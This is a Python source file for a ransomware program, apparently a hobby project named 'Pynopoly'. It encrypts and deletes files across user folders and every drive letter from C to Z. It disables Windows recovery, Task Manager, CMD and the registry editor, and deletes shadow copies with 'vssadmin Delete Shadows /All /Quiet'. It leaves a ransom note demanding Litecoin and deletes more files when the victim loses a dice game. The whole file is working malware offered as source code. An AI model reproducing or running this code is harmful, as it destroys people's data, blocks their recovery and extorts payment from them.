import os,random,sys,ctypes
try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Hash import SHA256
    from Cryptodome import Random
except ImportError:
        try:
            os.system('pip install pycryptodomex')
        except:
            pass

userhome = os.path.expanduser('~')
punish_counter = 10
wallpaper = "https://images6.alphacoders.com/424/424115.png"
address = "Insert Address Here"

def register():
    #method to try and disable system policies that allow for recovering and tries to disable tools
    try:
        os.system('bcdedit /set {default} recoveryenabled No')
        os.system('bcdedit /set {default} bootstatuspolicy ignoreallfailures')
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f')
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f')
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f')
        os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRun /d 1 /f')
    except:
        pass


def destroy_shadow_copy():
    #tries to delete all window shadow copies
    try:
        os.system('vssadmin Delete Shadows /All /Quiet')
    except:
        pass

def set_wallpaper():
    #Tries to set wallpaper to fitting image
    SPI_SETDESKWALLPAPER = 20
    try:
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper, 0)
    except:
        pass

def failure():
    #deletes folders for random number of times
    deleteCounter = random.randint(1,20)
    for filename in encFiles:
        #itereates through files
        for i in range(deleteCounter):
            try:
                print("Adios ", filename)
                os.remove(filename)
                if(filecounter != None or filecounter != 0):
                    filecounter-=1
            except:
                pass

def write_instruction(dir, ext):
    #Writes Instruction to file
    try:
        files = open(dir + '\\README_FOR_DECRYPT.' + ext, 'w')
        files.write(message())
    except:
        pass

def message():
    #returns message
    x = ""
    x+="All your files have been encrypted but don't worry you can try and get them back..."
    x+="If you are able to get 3 pairs of doubles in a row you can get your files back"
    x+="However if you fail you will get punished"
    x+="Every time you try your luck and fail we will start by deleting 10 random files"
    x+="Then we will delete 100 files then 1000 files then 10,000 files, etc...."
    x+="Or you can just send $25 in LTC to: "
    x+= str(address)
    return x

def try_your_luck():
    #Tries users luck to try and get password
    counter = 0
    for i in range(0,3):
        first_dice = random.randint(1, 3)
        second_dice = random.randint(1, 3)
        print("First dice: ",first_dice)
        print("Second dice ",second_dice)
        if first_dice == second_dice:
            print("First dice and second dice are equal")
            counter+=1
    if counter == 3:
        print("Wow you got doubles thrice here is your reward: ", password) #they got the goods
    else:
        print("You weren't lucky and didn't get doubles, failure. ") #they failed
        failure()

def decrypt(key, filename):
    #decrypts file given name and key
    outFile = os.path.join(os.path.dirname(filename), os.path.basename(filename[11:]))
    chunksize = 64 * 1024
    with open(filename, "rb") as infile:
        filesize = infile.read(16)
        IV = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, IV)
        with open(outFile, "wb") as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break

                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(int(filesize))

def encrypt(key,filename):
    #encrypts file with a key
    chunksize  = 64 *1024
    outFile = os.path.join(os.path.dirname(filename),"(encrypted)" + os.path.basename(filename))
    filesize = str(os.path.getsize(filename)).zfill(16)
    iv = Random.new().read(AES.block_size) #use random in cryptodome to get iv
    encryptor = AES.new(key,AES.MODE_CBC,iv) #create aes key
    with open(filename,"rb") as infile:
        with open(outFile,"wb") as outFile:
            outFile.write(filesize.encode()) #encode because it needs to be bytes
            #outFile.write(IV)
            outFile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' '.encode() * (16-(len(chunk) %16)) #encode emptystring because it needs to be bytes
                outFile.write(encryptor.encrypt(chunk))


def files2crypt(path):
    #method that walks through path (most likely directory) and appends those files to list
    allFiles = []
    for root, subfiles, files in os.walk(path):
        if 'Windows' or 'Python' not in root: #if windows or Python file do not encrypt
            for names in files:
                if names == 'Pynopoly.py': #does not encrypt the python file currently running
                    continue
                else:
                    allFiles.append(os.path.join(root, names))
    return allFiles

def main():
    #main method where major logic happens, user's files get encrypted and they have the chance to get password to decrypt them
    #or lose them all
    global password, encFiles, filecounter
    encFiles = []
    #password = input("Enter the password: ")
    password = b"test"
    filecounter = 0
    listdir = (userhome + '\\Contacts\\',
               userhome + '\\Documents\\',
               userhome + '\\Downloads\\',
               userhome + '\\Favorites\\',
               userhome + '\\Links\\',
               userhome + '\\My Documents\\',
               userhome + '\\My Music\\',
               userhome + '\\My Pictures\\',
               userhome + '\\My Videos\\',
               'C:\\',
               'D:\\',
               'E:\\',
               'F:\\',
               'G:\\',
               'I:\\',
               'J:\\',
               'K:\\',
               'L:\\',
               'M:\\',
               'N:\\',
               'O:\\',
               'P:\\',
               'Q:\\',
               'R:\\',
               'S:\\',
               'T:\\',
               'U:\\',
               'V:\\',
               'W:\\',
               'X:\\',
               'Y:\\',
               'Z:\\')
    for possibleDir in listdir:
        #for possibleDir on system
        path = files2crypt(possibleDir)
        for file in path:
            filecounter+=1
            encFiles.append(file) #add to encFiles to encrypt
    register()
    set_wallpaper()
    destroy_shadow_copy()
    write_instruction(userhome + '\\Desktop\\', 'txt') #write instructions to user's desktop
    os.startfile(userhome + '\\Desktop\\README_FOR_DECRYPT.txt')
    for file in encFiles:
        #iterate through files in Encfiles and encrypt them
        if os.path.basename(file).startswith("(encrypted)"):
            print("%s is already encrypted" % str(file))
            pass
        elif file == os.path.join(os.getcwd(), sys.argv[0]):
            #makes sure current program does not get encrypted
            pass
        else:
            encrypt(SHA256.new(password).digest(), str(file))
            # print("Done encrypting %s" % str(file))
            os.remove(file)
    while filecounter/2 > 0:
        choice = input("Do you want to (T)ry your luck: ? or (D)ecrypt file")
        if choice == "T":
            try_your_luck()
        elif choice == "D":
            filename = input("Enter the filename to decrypt: ")
            if not os.path.exists(filename):
                print("The file does not exist")
                continue
                #sys.exit(0)
            elif not filename.startswith("(encrypted)"):
                print("%s is already not encrypted" % filename)
                continue
                #sys.exit()
            else:
                decrypt(SHA256.new(password).digest(), filename)
                print("Done decrypting %s" % filename)
                # os.remove(filename)
                filecounter-=1
        else:
            print("Please choose a valid command.")
            continue

if __name__ == '__main__':
    main()